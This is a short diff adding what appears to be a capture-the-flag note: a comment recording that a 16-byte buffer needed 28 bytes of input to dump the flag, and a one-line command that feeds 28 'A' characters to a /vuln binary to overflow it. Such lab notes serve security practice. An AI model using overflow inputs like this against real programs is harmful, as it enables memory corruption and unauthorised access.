@@ -1,0 +1,5 @@
+# buffer is 16.  Had to go to 28 to get it to dump flag.
+
+/vuln $(python -c 'print "A" * 28')
+
+
